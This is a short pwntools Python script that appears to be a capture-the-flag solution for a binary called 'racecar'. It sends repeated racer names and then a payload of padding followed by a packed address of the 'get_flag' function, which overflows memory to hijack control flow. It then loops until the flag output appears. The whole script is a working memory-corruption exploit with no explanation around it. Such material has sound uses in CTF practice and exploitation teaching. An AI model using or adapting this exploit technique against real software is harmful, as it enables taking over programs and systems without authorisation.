#!/usr/bin/python3

from pwn import *

exe = ELF('racecar', checksec=False)

context.binary = exe

def GDB():
	if not args.REMOTE:
		gdb.attach(p, gdbscript='''
		b*0x4017cb
		
		c
		''')
		input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
	p = remote('127.0.0.1', 10002)
else:
	p = process(exe.path)

for i in range(5):
	sla(b'> ', b'1')
	sla(b'racer: ', str(i).encode()*256)
for i in range(0x35, 0x3a):
	sla(b'> ', b'1')
	sla(b'racer: ', p8(i)*0x28 + p64(exe.sym['get_flag'] + 5))

while True:
	sla(b'> ', b'2')
	p.recvuntil(b'Our winner: ')
	output = p.recvline()[:-1]
	print(output, '\n')
	if len(output) > 256:
		break
print(p.recvall())